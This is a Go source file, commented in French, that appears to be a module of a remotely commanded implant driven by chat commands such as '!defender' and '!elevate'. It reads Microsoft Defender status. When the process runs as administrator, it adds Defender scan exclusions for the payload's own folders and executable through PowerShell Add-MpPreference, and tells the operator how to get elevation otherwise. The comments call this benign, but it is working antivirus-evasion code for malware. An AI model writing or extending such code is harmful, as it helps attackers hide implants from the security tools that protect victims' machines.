// defender.go — état de Microsoft Defender et exclusions.
//
// Rien ici ne désactive la protection : on se contente de lire l'état et,
// quand le processus est déjà administrateur, d'ajouter des exclusions pour
// les dossiers du payload. Sans droits, la seule voie est `!elevate` (une
// invite UAC s'affiche sur la machine, que l'utilisateur du poste doit
// accepter) — aucune élévation silencieuse n'existe.
package main

import (
	"fmt"
	"strings"
)

// defenderStatus rend l'état du service, de la protection en temps réel et
// des exclusions existantes.
func defenderStatus() string {
	out, err := runPSUTF8(
		"$s = Get-MpComputerStatus;" +
			"if (-not $s) { 'Defender indisponible'; exit }" +
			"'service      : ' + $s.AMServiceEnabled;" +
			"'antivirus    : ' + $s.AntivirusEnabled;" +
			"'temps reel   : ' + $s.RealTimeProtectionEnabled;" +
			"'signatures   : ' + $s.AntivirusSignatureVersion + ' (' + $s.AntivirusSignatureLastUpdated + ')';" +
			"'exclusions   :';" +
			"$p = (Get-MpPreference).ExclusionPath;" +
			"if ($p) { $p } else { '  (aucune)' }")
	if err != nil && strings.TrimSpace(out) == "" {
		return "Defender : lecture impossible (" + err.Error() + ")"
	}
	return "```\n" + strings.TrimSpace(out) + "\n```"
}

// defenderExclude ajoute les dossiers du payload aux exclusions. Réservé à un
// processus élevé : sinon on explique la marche à suivre.
func defenderExclude() string {
	exe := currentExe()
	dirs := []string{workDir(), shadowDir()}
	if exe != "" {
		dirs = append(dirs, exe)
	}
	if !isElevated() {
		return "**Exclusion refusée : droits administrateur requis.**\n" +
			"Lance `!elevate Add-MpPreference -ExclusionPath ...` : une invite UAC " +
			"s'affiche sur la machine et doit être acceptée. Sans cette acceptation, " +
			"aucune exclusion ne peut être posée — c'est la limite de Windows, pas " +
			"du payload.\nDossiers concernés :\n```\n" + strings.Join(dirs, "\n") + "\n```"
	}
	var lines []string
	lines = append(lines, "$paths = @(")
	for i, d := range dirs {
		if d == "" {
			continue
		}
		if i > 0 {
			lines = append(lines, ",")
		}
		lines = append(lines, qPS(d))
	}
	lines = append(lines, ");")
	lines = append(lines, "foreach ($p in $paths) { try { Add-MpPreference -ExclusionPath $p -ErrorAction Stop } catch { Write-Output ('echec : ' + $p + ' — ' + $_.Exception.Message) } };")
	lines = append(lines, "'exclusions ajoutees';")
	lines = append(lines, "(Get-MpPreference).ExclusionPath")
	out, err := runPSUTF8(strings.Join(lines, "\n"))
	if err != nil && strings.TrimSpace(out) == "" {
		return "exclusion impossible : " + err.Error()
	}
	return "```\n" + strings.TrimSpace(out) + "\n```"
}

// defenderReport aiguille `!defender` et `!defender exclude`.
func defenderReport(arg string) string {
	switch strings.ToLower(strings.TrimSpace(arg)) {
	case "exclude", "exclure", "on":
		return defenderExclude()
	case "", "status", "etat", "état":
		return defenderStatus()
	default:
		return fmt.Sprintf("usage : `!defender` (état) ou `!defender exclude` (ajoute les exclusions, admin requis)")
	}
}
